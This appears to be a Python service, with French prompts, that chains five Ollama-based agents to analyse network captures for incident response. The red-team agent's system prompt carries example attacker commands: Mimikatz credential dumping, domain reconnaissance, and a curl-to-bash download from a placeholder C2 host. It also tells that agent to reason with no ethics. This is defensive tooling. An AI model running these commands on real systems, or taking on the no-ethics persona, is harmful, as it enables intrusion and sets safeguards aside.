"""
Service Multi-Agent IA avec Ollama
Cyber Investigation Team — 4 agents spécialisés en cybersécurité :
- Threat Hunter : détection de menaces et hypothèses d'attaque
- Incident Commander : coordination et plan de réponse à incident
- Forensic Engineer : analyse technique, outils forensic et remédiation
- SOC Analyst : validation, score de risque et verdict final
"""

import json
import time
import logging
from typing import Dict, List, Any, Optional
from app.services.ai_analysis_service import ai_service

logger = logging.getLogger(__name__)


class Agent:
    """Représente un agent IA spécialisé"""
    
    def __init__(self, name: str, role: str, emoji: str, system_prompt: str):
        self.name = name
        self.role = role
        self.emoji = emoji
        self.system_prompt = system_prompt
    
    def generate_prompt(self, context: Dict, previous_agents: List[Dict] = None) -> str:
        """Génère le prompt complet pour cet agent"""
        prompt = f"{self.system_prompt}\n\n"
        prompt += f"=== DONNÉES D'ANALYSE PCAP ===\n{json.dumps(context, indent=2, ensure_ascii=False)}\n\n"
        
        if previous_agents:
            prompt += "=== ANALYSES PRÉCÉDENTES DES AUTRES AGENTS ===\n\n"
            for agent_result in previous_agents:
                prompt += f"--- {agent_result['emoji']} {agent_result['name']} ({agent_result['role']}) ---\n"
                prompt += f"{agent_result['analysis']}\n\n"
        
        prompt += "\nRÈGLES OBLIGATOIRES :\n"
        prompt += "- Réponds en français\n"
        prompt += "- Sois technique, précis et actionnable (niveau SOC L3 / NOC senior)\n"
        prompt += "- Chaque conclusion doit citer au moins une preuve chiffrée issue du contexte\n"
        prompt += "- Distingue explicitement FAITS OBSERVÉS, HYPOTHÈSES et INCERTITUDES\n"
        prompt += "- Ne fabrique jamais de données absentes; écris INCONNU si nécessaire\n"
        prompt += "- Propose des tests de validation/falsification concrets\n"
        prompt += "- Structure ta réponse avec des sections claires et lisibles\n"
        
        return prompt


# Définition des 4 agents
AGENTS = {
    "brainstormer": Agent(
        name="Threat Hunter",
        role="Détection & Hypothèses de menaces",
        emoji="🎯",
        system_prompt="""Tu es le THREAT HUNTER de la Cyber Investigation Team.

OBJECTIF:
Détecter les signaux d'attaque ET les signaux de dysfonctionnement réseau (latence, congestion, pertes, resets, saturation) visibles dans le PCAP.

MÉTHODE IMPOSÉE:
1. Raisonner uniquement depuis les données fournies.
2. Pour chaque conclusion, citer une preuve au format:
   - [preuve] champ=<chemin du contexte> | valeur=<valeur> | interprétation=<impact>
3. Séparer explicitement:
   - Faits observés
   - Hypothèses
   - Points inconnus
4. Proposer des tests concrets pour confirmer ou infirmer chaque hypothèse.

LIVRABLES OBLIGATOIRES:

1) VERDICT TECHNIQUE GLOBAL
- Menace cyber: CRITIQUE / ÉLEVÉ / MODÉRÉ / FAIBLE
- Santé réseau: DÉGRADÉE / INSTABLE / SAINE
- Score de confiance global (/100) + justification.

2) MATRICE DES SIGNAUX CRITIQUES (min 8)
Inclure signaux sécurité ET performance:
- Exemples attendus: beaconing, DGA/NXDOMAIN, exfiltration potentielle, scans,
  retransmissions élevées, zero-window, bursts, RTT anormal, resets massifs,
  bruit broadcast/multicast, concentration par MAC/constructeur.

3) HYPOTHÈSES PRIORISÉES (max 5)
Pour chaque hypothèse:
- Probabilité (%)
- Preuves POUR / CONTRE
- Test de validation (filtre Wireshark/tshark attendu)
- Impact si confirmé

4) CARTOGRAPHIE ATT&CK (si activité malveillante plausible)
- Technique ATT&CK
- Observable réseau associé
- Niveau de confiance

5) IoC & INDICATEURS DE DÉGRADATION
- IoCs malveillants: IPs, domaines, patterns
- Entités réseau problématiques: IP/flux/ports/sessions avec raison technique

6) QUESTIONS CRITIQUES RESTANTES (5 max)
- Questions factuelles à résoudre pour fermer l'enquête."""
    ),

    "chef_projet": Agent(
        name="Incident Commander",
        role="Coordination & Plan de réponse",
        emoji="🛡️",
        system_prompt="""Tu es l'INCIDENT COMMANDER de la Cyber Investigation Team.

OBJECTIF:
Transformer les constats techniques en plan d'action priorisé pour contenir un incident ou corriger une dégradation réseau critique.

MÉTHODE IMPOSÉE:
- Prioriser selon impact business, urgence technique et certitude des preuves.
- Distinguer clairement:
  1) Mesures de containment sécurité
  2) Mesures de stabilisation performance réseau
- Si une information manque, indique le risque décisionnel associé.

LIVRABLES OBLIGATOIRES:

1) SITUATION REPORT (max 10 lignes)
- Niveau: SEV1/SEV2/SEV3/SEV4
- Statut: ACTIF / CONTENU / INSTABLE / RÉSOLU / INCONNU
- Résumé factuel avec 3 preuves clés.

2) TIMELINE OPÉRATIONNELLE
- Chronologie avec timestamps significatifs
- Point de bascule (début impact)
- Fenêtres aveugles (gaps capture/logs)

3) PLAN D'ACTION PRIORISÉ (P1 à P4)
Pour chaque action:
- objectif
- propriétaire (SOC/NOC/NetOps/SecOps/Système)
- délai cible
- critère de succès mesurable
- risque si non exécutée

4) RUNBOOK DÉCISIONNEL
- Branche A: compromission confirmée
- Branche B: anomalie réseau non malveillante
- Branche C: incertain (données insuffisantes)

5) PÉRIMÈTRE IMPACTÉ
- Hôtes/IP/segments touchés
- Services/protocoles dégradés
- Données potentiellement exposées ou flux critiques dégradés

6) MESSAGE EXÉCUTIF (RSSI/DSI, 120 mots max)
- Impact business concret
- Niveau de risque réglementaire/compliance
- Décision recommandée immédiate."""
    ),

    "programmeur": Agent(
        name="Forensic Engineer",
        role="Analyse technique & Outils forensic",
        emoji="🔬",
        system_prompt="""Tu es le FORENSIC ENGINEER de la Cyber Investigation Team.

OBJECTIF:
Produire une investigation packet-level ultra-technique pour identifier la cause racine (attaque, panne réseau, saturation, mauvaise config).

RÈGLES:
- Toutes les commandes/filtres doivent être copiables-collables.
- Chaque artefact proposé doit indiquer ce qu'il permet de prouver.
- Prioriser les preuves à forte valeur diagnostique.

LIVRABLES OBLIGATOIRES:

1) FILTRES WIRESHARK PAR FAMILLE DE PROBLÈME
Donner des filtres précis + interprétation attendue pour:
- retransmissions / out-of-order / dup-ack / lost-segment
- zero-window / window-full / window update / window scaling
- handshake TCP incomplet / resets / half-open
- DNS erreurs (NXDOMAIN, SERVFAIL) et latence
- TLS (versions, alerts, SNI, ciphers faibles)
- HTTP (4xx/5xx, POST volumineux, user-agent suspect)
- scans et trafic latéral
- L2 (ARP excessif, broadcast/multicast storm, corrélation IP↔MAC↔constructeur)

2) COMMANDES TSHARK/TCPDUMP (triage + preuve)
Inclure commandes pour:
- top talkers, conversations, ports
- chronologie des événements critiques
- extraction sessions suspectes
- métriques RTT/retrans/window si possible

3) SCRIPT AUTOMATION (Python/Scapy ou PyShark)
Fournir un script court mais fonctionnel qui:
- classe les sessions problématiques
- score chaque flow (retrans, rst, état, volume, burst)
- sort un top 10 des flux/IP à investiguer

4) CORRÉLATION SIEM/IDS
- 3 requêtes Splunk/KQL prêtes à l'emploi
- 2 règles Suricata orientées IoCs observés
- 1 règle Sigma orientée comportement

5) PLAN DE VALIDATION TECHNIQUE
Pour chaque hypothèse majeure:
- test à exécuter
- résultat attendu si vrai
- résultat attendu si faux
- next step immédiat

6) REMÉDIATION TECHNIQUE CIBLÉE
- Actions court terme (containment/stabilisation)
- Correctifs moyen terme (configuration réseau, durcissement, monitoring)."""
    ),

    "validateur": Agent(
        name="SOC Analyst",
        role="Validation, Score de risque & Verdict final",
        emoji="🔍",
        system_prompt="""Tu es le SOC ANALYST L3 de la Cyber Investigation Team.

OBJECTIF:
Valider, réfuter ou nuancer les conclusions des autres agents pour produire un verdict fiable, défendable et exploitable en production SOC/NOC.

MÉTHODE:
- Standard de preuve élevé: pas de conclusion sans observable.
- Chercher activement les faux positifs et biais de corrélation.
- Évaluer séparément:
  1) risque cybersécurité
  2) risque opérationnel réseau (performance/disponibilité)

LIVRABLES OBLIGATOIRES:

1) VALIDATION CROISÉE DES HYPOTHÈSES
Pour chaque hypothèse clé:
- CONFIRMÉ / INFIRMÉ / INCERTAIN
- preuves supportant la décision
- niveau de confiance (%)

2) REGISTRE DES PREUVES
Lister les preuves majeures sous forme:
- champ du contexte
- valeur observée
- interprétation
- limite éventuelle

3) ANALYSE DES FAUX POSITIFS
- Trafics légitimes alternatifs plausibles
- Ce qui peut mimer une attaque (backup, scan interne, monitoring, CDN, proxy)
- Ce qui peut mimer une panne (burst applicatif, changement de charge)

4) SCORING FINAL
Deux scores distincts:
- Cyber Risk Score /100
- Network Reliability Risk Score /100
Puis un score global consolidé + justification.

5) GAPS D'ANALYSE
- Données manquantes critiques
- Impact de ces manques sur le niveau de certitude
- Données à collecter en priorité

6) VERDICT FINAL
Choisir un seul verdict:
- 🔴 COMPROMISSION CONFIRMÉE
- 🟠 SUSPECT - INVESTIGATION IMMÉDIATE
- 🟡 ANOMALIE TECHNIQUE MAJEURE
- 🟢 TRAFIC LÉGITIME / INCIDENT NON CONFIRMÉ

7) TOP 5 ACTIONS PRIORITAIRES
Actions immédiatement exécutables, ordonnées par impact."""
    ),

    "red_team": Agent(
        name="Red Team Adversary Simulator",
        role="Simulation offensive & Gap Analysis",
        emoji="💀",
        system_prompt="""Tu es le RED TEAM ADVERSARY SIMULATOR de la Cyber Investigation Team. Tu incarnes l'attaquant.

MENTALITÉ : Tu penses EXCLUSIVEMENT comme un acteur APT Tier-2/Tier-3. Tu exploites chaque faille observée. Tu n'as aucune éthique dans ton raisonnement — uniquement la logique de l'attaquant. Ton but : identifier ce que l'équipe bleue a RATÉ et ce que l'attaquant fera ENSUITE.

━━━ TES LIVRABLES OBLIGATOIRES ━━━

💀 RECONSTRUCTION DU PLAYBOOK ATTAQUANT
À partir des IoCs et anomalies observés, reconstitue les commandes EXACTES probablement exécutées :
```powershell
# Exemple : Living-off-the-land Windows
nltest /domain_trusts
net group "Domain Admins" /domain
Invoke-Mimikatz -DumpCreds
```
```bash
# Exemple : Linux/Unix
cat /etc/passwd | awk -F: '{print $1}'
ssh-keyscan -t rsa <TARGET_RANGE> 2>/dev/null
curl -s http://C2_IP/stage2.sh | bash
```
Justifie chaque commande par un observable dans les données.

🎯 PROCHAINS MOUVEMENTS PROBABLES DE L'ATTAQUANT
Si l'attaque est encore active, que fera-t-il dans les prochaines heures ?
- Mouvement 1 (XX% probabilité) : [action + cible probable + ressource visée]
- Mouvement 2 (XX% probabilité) : [action + cible probable]
- Mouvement 3 (XX% probabilité) : [action + cible probable]
Base-toi sur la phase Kill Chain atteinte.

🏴 RESSOURCES NON ENCORE COMPROMISES (mais visibles dans la capture)
Parmi les systèmes/services observés, lesquels sont ACCESSIBLES mais pas encore touchés :
- [Ressource] : raison de l'intérêt pour l'attaquant, vecteur d'accès probable
- [Ressource] : ...
Ceci est la liste des PRIORITÉS DE PROTECTION URGENTES.

🕳️ ANGLES MORTS DE DÉTECTION
Ce que l'équipe bleue n'a PAS vu et que l'attaquant a exploité intentionnellement :
- Technique d'évasion utilisée : [ex: Living-off-the-land, signed binary proxy, timestomping]
- Logs absents ou insuffisants (ce que l'attaquant sait que vous ne loggez pas)
- Période de capture manquante exploitée
- Chiffrement ou obfuscation masquant la payload

🧪 TESTS RED TEAM RECOMMANDÉS
Pour valider les gaps de détection identifiés, lance ces tests en environnement contrôlé :
1. [Commande/outil] : [ce qu'il teste] — [résultat attendu si vulnérable]
2. [Commande/outil] : ...
3. [Commande/outil] : ...

🔴 VERDICT OFFENSIF
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  DEPUIS LA POSITION DE L'ATTAQUANT :
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
- Mission accomplie ? OUI/PARTIELLEMENT/NON
- Persistance installée ? OUI/NON/PROBABLE
- Exfiltration réussie ? OUI/NON/EN COURS
- Détection probable par l'équipe bleue ? OUI/NON/PARTIELLE
- Niveau de sophistication APT : SCRIPT KIDDIE / CYBERCRIMINEL / APT ÉTATIQUE

RÈGLES STRICTES :
- Réponds en français
- Sois précis et technique — pas de généralités
- Toutes les commandes doivent être réelles et fonctionnelles
- Si une donnée manque, indique CE QUE TU AURAIS BESOIN pour affiner l'analyse"""
    )
}

AGENT_ORDER = ["brainstormer", "chef_projet", "programmeur", "validateur", "red_team"]


class AgentTeamService:
    """Service orchestrant l'équipe de 4 agents IA"""
    
    def __init__(self):
        self.agents = AGENTS
        self.agent_order = AGENT_ORDER
    
    def is_available(self) -> bool:
        """Vérifie si le service Ollama est disponible"""
        return ai_service.is_available()
    
    def get_agents_info(self) -> List[Dict]:
        """Retourne les informations sur les agents"""
        return [
            {
                "id": agent_id,
                "name": agent.name,
                "role": agent.role,
                "emoji": agent.emoji
            }
            for agent_id, agent in self.agents.items()
        ]
    
    def run_single_agent(self, agent_name: str, analysis_results: Dict) -> Dict[str, Any]:
        """
        Lance un seul agent sur les résultats d'analyse
        """
        if agent_name not in self.agents:
            return {
                "success": False,
                "error": f"Agent '{agent_name}' non trouvé. Agents disponibles: {list(self.agents.keys())}"
            }
        
        agent = self.agents[agent_name]
        context = self._prepare_team_context(analysis_results)
        
        logger.info(f"{agent.emoji} Lancement de l'agent {agent.name}...")
        start_time = time.time()
        
        try:
            prompt = agent.generate_prompt(context)
            response = ai_service._call_ollama(prompt)
            elapsed = time.time() - start_time
            
            logger.info(f"{agent.emoji} Agent {agent.name} terminé en {elapsed:.1f}s")
            
            return {
                "success": True,
                "agent": {
                    "id": agent_name,
                    "name": agent.name,
                    "role": agent.role,
                    "emoji": agent.emoji
                },
                "analysis": response,
                "structured": ai_service.extract_structured_response(response),
                "duration": round(elapsed, 1),
                "model": ai_service.model
            }
            
        except Exception as e:
            logger.error(f"❌ Erreur agent {agent.name}: {e}")
            return {
                "success": False,
                "agent": {
                    "id": agent_name,
                    "name": agent.name,
                    "role": agent.role,
                    "emoji": agent.emoji
                },
                "error": str(e),
                "structured": ai_service.extract_structured_response(str(e))
            }
    
    def run_full_team(self, analysis_results: Dict) -> Dict[str, Any]:
        """
        Lance l'équipe complète d'agents séquentiellement.
        Chaque agent reçoit le contexte + les résultats des agents précédents.
        """
        if not ai_service.is_available():
            return {
                "success": False,
                "error": "Service Ollama non disponible. Démarrez Ollama avec: OLLAMA_HOST=0.0.0.0:11434 ollama serve"
            }
        
        context = self._prepare_team_context(analysis_results)
        
        team_results = {
            "success": True,
            "agents": [],
            "total_duration": 0,
            "model": ai_service.model,
            "workflow": []
        }
        
        previous_results = []
        total_start = time.time()
        
        for agent_id in self.agent_order:
            agent = self.agents[agent_id]
            logger.info(f"\n{'='*60}")
            logger.info(f"{agent.emoji} LANCEMENT AGENT : {agent.name}")
            logger.info(f"{'='*60}")
            
            agent_start = time.time()
            
            try:
                prompt = agent.generate_prompt(context, previous_results if previous_results else None)
                response = ai_service._call_ollama(prompt)
                agent_duration = time.time() - agent_start
                
                agent_result = {
                    "id": agent_id,
                    "name": agent.name,
                    "role": agent.role,
                    "emoji": agent.emoji,
                    "analysis": response,
                    "structured": ai_service.extract_structured_response(response),
                    "duration": round(agent_duration, 1),
                    "status": "completed",
                    "order": len(previous_results) + 1
                }
                
                team_results["agents"].append(agent_result)
                previous_results.append(agent_result)
                
                team_results["workflow"].append({
                    "step": len(previous_results),
                    "agent": agent.name,
                    "emoji": agent.emoji,
                    "status": "completed",
                    "duration": round(agent_duration, 1)
                })
                
                logger.info(f"{agent.emoji} Agent {agent.name} terminé en {agent_duration:.1f}s ({len(response)} chars)")
                
            except Exception as e:
                agent_duration = time.time() - agent_start
                logger.error(f"❌ Erreur agent {agent.name}: {e}")
                
                agent_result = {
                    "id": agent_id,
                    "name": agent.name,
                    "role": agent.role,
                    "emoji": agent.emoji,
                    "analysis": f"Erreur lors de l'analyse: {str(e)}",
                    "structured": ai_service.extract_structured_response(str(e)),
                    "duration": round(agent_duration, 1),
                    "status": "error",
                    "error": str(e),
                    "order": len(previous_results) + 1
                }
                
                team_results["agents"].append(agent_result)
                previous_results.append(agent_result)
                
                team_results["workflow"].append({
                    "step": len(previous_results),
                    "agent": agent.name,
                    "emoji": agent.emoji,
                    "status": "error",
                    "duration": round(agent_duration, 1),
                    "error": str(e)
                })
        
        team_results["total_duration"] = round(time.time() - total_start, 1)
        
        logger.info(f"\n🏁 Analyse d'équipe terminée en {team_results['total_duration']}s")
        logger.info(f"   Agents complétés: {sum(1 for a in team_results['agents'] if a['status'] == 'completed')}/{len(self.agent_order)}")
        
        return team_results
    
    def chat_with_agent(self, agent_name: str, message: str, analysis_results: Dict) -> Dict[str, Any]:
        """
        Chat interactif avec un agent spécifique
        """
        if agent_name not in self.agents:
            return {
                "success": False,
                "error": f"Agent '{agent_name}' non trouvé"
            }
        
        if not ai_service.is_available():
            return {
                "success": False,
                "error": "Service Ollama non disponible"
            }
        
        agent = self.agents[agent_name]
        context = self._prepare_team_context(analysis_results)
        
        prompt = f"""{agent.system_prompt}

=== CONTEXTE D'ANALYSE PCAP ===
{json.dumps(context, indent=2, ensure_ascii=False)}

=== QUESTION DE L'UTILISATEUR ===
{message}

Réponds en tant que {agent.name} ({agent.role}).
Sois très technique et factuel. Cite des preuves chiffrées du contexte.
Distingue faits, hypothèses et inconnues. Réponds en français."""
        
        try:
            start_time = time.time()
            response = ai_service._call_ollama(prompt)
            elapsed = time.time() - start_time
            
            return {
                "success": True,
                "agent": {
                    "id": agent_name,
                    "name": agent.name,
                    "role": agent.role,
                    "emoji": agent.emoji
                },
                "response": response,
                "structured": ai_service.extract_structured_response(response),
                "duration": round(elapsed, 1),
                "model": ai_service.model
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "structured": ai_service.extract_structured_response(str(e))
            }
    
    def _prepare_team_context(self, results: Dict) -> Dict:
        """Prépare un contexte enrichi pour l'équipe d'agents"""
        def _safe_dict(value: Any) -> Dict[str, Any]:
            return value if isinstance(value, dict) else {}

        def _safe_list(value: Any) -> List[Any]:
            return value if isinstance(value, list) else []

        def _top_entries(value: Any, limit: int = 10) -> List[Dict[str, Any]]:
            if isinstance(value, list):
                return [v for v in value if isinstance(v, dict)][:limit]
            if isinstance(value, dict):
                items = []
                for k, v in value.items():
                    if isinstance(v, dict):
                        item = {"name": str(k), **v}
                    else:
                        item = {"name": str(k), "value": v}
                    items.append(item)
                return items[:limit]
            return []

        protocol = _safe_dict(results.get('protocol_analysis'))
        tcp = _safe_dict(results.get('tcp_analysis'))
        anomaly = _safe_dict(results.get('anomaly_detection') or results.get('anomaly_analysis'))
        dns = _safe_dict(results.get('dns_analysis'))
        http = _safe_dict(results.get('http_analysis'))

        smb = _safe_dict(results.get('smb_analysis'))
        ldap = _safe_dict(results.get('ldap_analysis'))
        kerberos = _safe_dict(results.get('kerberos_analysis'))
        rdp = _safe_dict(results.get('rdp_analysis'))
        ssh = _safe_dict(results.get('ssh_analysis'))

        protocol_summary = _safe_dict(protocol.get('summary'))
        tcp_summary = _safe_dict(tcp.get('summary'))
        anomaly_summary = _safe_dict(anomaly.get('summary'))
        dns_summary = _safe_dict(dns.get('summary'))
        http_summary = _safe_dict(http.get('summary'))

        tcp_sessions = [s for s in _safe_list(tcp.get('sessions')) if isinstance(s, dict)]
        anomaly_items = [a for a in _safe_list(anomaly.get('anomalies')) if isinstance(a, dict)]

        def _session_packets(s: Dict[str, Any]) -> int:
            return int(s.get('packets', s.get('packet_count', 0)) or 0)

        def _session_retrans(s: Dict[str, Any]) -> int:
            return int(s.get('retransmissions', 0) or 0)

        def _session_rst(s: Dict[str, Any]) -> int:
            return int(s.get('rst_count', 0) or 0)

        top_sessions_packets = sorted(tcp_sessions, key=_session_packets, reverse=True)[:15]
        top_sessions_retrans = sorted(tcp_sessions, key=_session_retrans, reverse=True)[:15]
        top_sessions_rst = sorted(tcp_sessions, key=_session_rst, reverse=True)[:15]

        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        anomaly_by_type: Dict[str, int] = {}
        for a in anomaly_items:
            sev = str(a.get('severity', '')).upper()
            if sev in severity_counts:
                severity_counts[sev] += 1
            atype = str(a.get('type', 'UNKNOWN'))
            anomaly_by_type[atype] = anomaly_by_type.get(atype, 0) + 1

        protocol_map = _safe_dict(protocol.get('protocols'))
        protocol_distribution = []
        for proto_name, proto_stats in protocol_map.items():
            stats = _safe_dict(proto_stats)
            protocol_distribution.append({
                "protocole": proto_name,
                "count": stats.get('count', 0),
                "bytes": stats.get('bytes', 0),
                "pourcentage": stats.get('percentage', 0)
            })
        protocol_distribution.sort(key=lambda x: x.get("count", 0), reverse=True)

        ip_stats = _safe_dict(protocol.get('ip_statistics'))
        mac_summary = _safe_dict(protocol.get('mac_statistics'))
        tcp_retrans = _safe_dict(tcp.get('retransmission_analysis'))
        tcp_rtt = _safe_dict(tcp.get('rtt_analysis'))
        tcp_window = _safe_dict(tcp.get('window_analysis'))
        tcp_handshake = _safe_dict(tcp.get('handshake_analysis'))
        tcp_states = _safe_dict(tcp.get('connection_states'))

        dns_response_times = _safe_dict(dns.get('response_times'))
        tls = _safe_dict(http.get('tls'))

        return {
            "meta": {
                "filename": _safe_dict(results.get('metadata')).get('filename', 'N/A'),
                "analysis_timestamp": _safe_dict(results.get('metadata')).get('analysis_timestamp', ''),
                "analysis_duration_seconds": _safe_dict(results.get('metadata')).get('analysis_duration_seconds', 0),
            },
            "vue_ensemble": {
                "total_paquets": protocol_summary.get('total_packets', 0),
                "total_bytes": protocol_summary.get('total_bytes', 0),
                "total_bytes_formatted": protocol_summary.get('total_bytes_formatted', 'N/A'),
                "durée_capture_secondes": protocol_summary.get('capture_duration_seconds', protocol_summary.get('duration', 0)),
                "paquets_par_seconde": protocol_summary.get('packets_per_second', 0),
                "bytes_par_seconde": protocol_summary.get('bytes_per_second', 0),
                "protocoles_détectés": list(protocol_map.keys()),
                "distribution_protocoles_top10": protocol_distribution[:10],
                "top_sources": _top_entries(ip_stats.get('top_sources'), 10),
                "top_destinations": _top_entries(ip_stats.get('top_destinations'), 10),
                "top_conversations": _top_entries(ip_stats.get('top_conversations'), 10),
                "couche_l2_mac": {
                    "unique_macs": mac_summary.get('unique_macs', 0),
                    "broadcast_packets": mac_summary.get('broadcast_packets', 0),
                    "multicast_packets": mac_summary.get('multicast_packets', 0),
                    "locally_administered_packets": mac_summary.get('locally_administered_packets', 0),
                    "top_macs": _top_entries(mac_summary.get('top_macs'), 15),
                    "top_vendors": _top_entries(mac_summary.get('top_vendors'), 10),
                    "top_pairs": _top_entries(mac_summary.get('top_pairs'), 10),
                },
            },
            "analyse_tcp": {
                "summary": tcp_summary,
                "handshake_analysis": tcp_handshake,
                "retransmission_analysis": tcp_retrans,
                "rtt_analysis": tcp_rtt,
                "window_analysis": tcp_window,
                "connection_states": tcp_states,
                "top_sessions_by_packets": [
                    {
                        "src": s.get('src', ''),
                        "dst": s.get('dst', ''),
                        "packets": _session_packets(s),
                        "state": s.get('state', ''),
                        "retransmissions": _session_retrans(s),
                        "rst_count": _session_rst(s),
                        "duration": s.get('duration', 0),
                    }
                    for s in top_sessions_packets
                ],
                "top_sessions_by_retransmissions": [
                    {
                        "src": s.get('src', ''),
                        "dst": s.get('dst', ''),
                        "packets": _session_packets(s),
                        "retransmissions": _session_retrans(s),
                        "state": s.get('state', ''),
                    }
                    for s in top_sessions_retrans
                    if _session_retrans(s) > 0
                ],
                "top_sessions_by_rst": [
                    {
                        "src": s.get('src', ''),
                        "dst": s.get('dst', ''),
                        "rst_count": _session_rst(s),
                        "packets": _session_packets(s),
                        "state": s.get('state', ''),
                    }
                    for s in top_sessions_rst
                    if _session_rst(s) > 0
                ],
                "tcp_flags_distribution": _safe_dict(protocol.get('tcp_flags')),
                "ports_top_dst": _top_entries(_safe_dict(protocol.get('ports')).get('top_dst_ports'), 15),
            },
            "anomalies": {
                "summary": anomaly_summary,
                "par_sévérité": severity_counts,
                "par_type_top15": sorted(
                    [{"type": k, "count": v} for k, v in anomaly_by_type.items()],
                    key=lambda x: x["count"],
                    reverse=True
                )[:15],
                "top_suspicious_ips": _top_entries(anomaly.get('top_suspicious_ips'), 20),
                "détails_top20": [
                    {
                        "type": a.get('type', ''),
                        "severity": a.get('severity', ''),
                        "score": a.get('score', 0),
                        "description": a.get('description', ''),
                        "source_ip": a.get('source_ip', ''),
                        "destination_ip": a.get('destination_ip', ''),
                    }
                    for a in anomaly_items[:20]
                ],
            },
            "dns": {
                "summary": dns_summary,
                "response_times": dns_response_times,
                "top_domaines": _top_entries(dns.get('top_domains'), 20),
                "dns_servers": _top_entries(dns.get('dns_servers'), 15),
                "query_types": _safe_dict(dns.get('query_types')),
                "response_codes": _safe_dict(dns.get('response_codes')),
                "anomalies_dns": _top_entries(dns.get('anomalies'), 10),
            },
            "http_https": {
                "summary": http_summary,
                "methods": _safe_dict(http.get('methods')),
                "status_codes": _safe_dict(http.get('status_codes')),
                "top_hosts": _top_entries(http.get('top_hosts') or http.get('hosts'), 20),
                "top_urls": _top_entries(http.get('top_urls'), 20),
                "top_user_agents": _top_entries(http.get('user_agents'), 20),
                "tls": {
                    "versions": _safe_dict(tls.get('versions')),
                    "cipher_suites": _top_entries(tls.get('cipher_suites'), 10),
                    "sni_hosts": _top_entries(tls.get('sni_hosts'), 20),
                },
                "anomalies_http": _top_entries(http.get('anomalies'), 10),
            },
            "protocoles_entreprise": {
                "smb": {
                    "summary": _safe_dict(smb.get('summary')),
                    "anomalies": _top_entries(smb.get('anomalies'), 8),
                },
                "ldap": {
                    "summary": _safe_dict(ldap.get('summary')),
                    "anomalies": _top_entries(ldap.get('anomalies'), 8),
                },
                "kerberos": {
                    "summary": _safe_dict(kerberos.get('summary')),
                    "anomalies": _top_entries(kerberos.get('anomalies'), 8),
                },
                "rdp": {
                    "summary": _safe_dict(rdp.get('summary')),
                    "anomalies": _top_entries(rdp.get('anomalies'), 8),
                },
                "ssh": {
                    "summary": _safe_dict(ssh.get('summary')),
                    "anomalies": _top_entries(ssh.get('anomalies'), 8),
                },
            },
        }


# Instance singleton
team_service = AgentTeamService()
